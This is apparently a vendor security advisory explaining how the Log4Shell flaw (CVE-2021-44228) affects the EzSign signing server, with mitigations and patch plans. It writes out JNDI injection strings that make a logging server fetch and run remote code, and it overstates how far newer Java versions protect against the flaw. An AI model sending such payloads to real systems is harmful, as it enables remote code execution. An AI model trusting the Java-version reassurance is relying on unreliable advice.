---
layout: default
title: EzSign CVE-2021-44228
parent: EzSign
nav_order: 100
---

# EzSign: CVE-2021-44228

> Apache Log4j2 Vulnerability (Log4Shell)



A vulnerability exists in log4j2 that leverages JNDI to potentially allow an attacker to provide a string that is interpreted as a variable  

JNDI does not enforce any security controls on LDAP requests, therefore if a string such as the following:

```
${jndi:ldap://[host]/[path]}
```

Could be logged, Log4J would interpret it as a variable and this would result in the classes available at the ``[host]/[path]`` location being downloaded and executed

<br>

## Am I Vulnerable

EzSign does makes use of the vulnerable  log4j2 libraries. However, input is passed to the server via the EzSign client and the client is itself driven by internal applications. Applications that utilise the EzSign client are not generally web facing  

Data sent to EzSign is generally tightly controlled (from trusted sources etc.), but data from an external source could enter the EzSign logs if sent as part of data to sign (or verify)  

If you hash this data before sending to EzSign then no original data will be sent to the EzSign logging system and a variable will  therefore not be logged

Also EzSign converts data it receives to Base64 before logging. So if an attack string does enter the system, it will not be logged as intended   

For example, if an attacker were to attempt to send the following string, as part of a message to sign data:

```
${jndi:ldap://example.com/executethis}
```

It would be logged as follows:

```
JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9leGVjdXRldGhpc30=
```

and if hashed prior, as:

```
mthnTlPO6hThbYbhQHyZ1uDVqN+CKyNcsdakX/GmckM=
```

I.e. the attack string is not sent to Log4J as the intended string - but the Base64 encoded form (of the original or hashed version). This means log4j is not sent the variable

<br>

Channel names, may be logged as sent to EzSign however. But these names are defined and configured by the trusted applications that call the EzSign client. They should not able to be passed in from external sources

<br>

### What should we do

If you are running EzSign against versions of Java greater than the following, 

- Java 7 – 7u202
- Java 8 – 8u192
- Java 11 - 11.0.2

You should not be vulnerable

<br>

In any case, you should set the following system property:

```
log4j2.formatMsgNoLookups=true
```

Or environment variable

```
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

To disable this behaviour

<br>

If EzSign is not performing any revocation checking (CRL or OCSP) then it does not need any external access. Restrict access from EzSign to any external sites using firewall rules

<br>

### Patches

Patches will be issued to replace the vulnerable log4j libraries. Once notified the process to replace is simple and should be scheduled in as soon as possible

<br>

### What version of Log4j2 does EzSign use?

Version 3.0.0 and earlier uses  Log4J version 2.7

Version 4.0.0 and later uses Log4J version 2.11.1

<br>

### More Information

Contact [Krestfield Support](mailto:support@krestfield.com) for more information

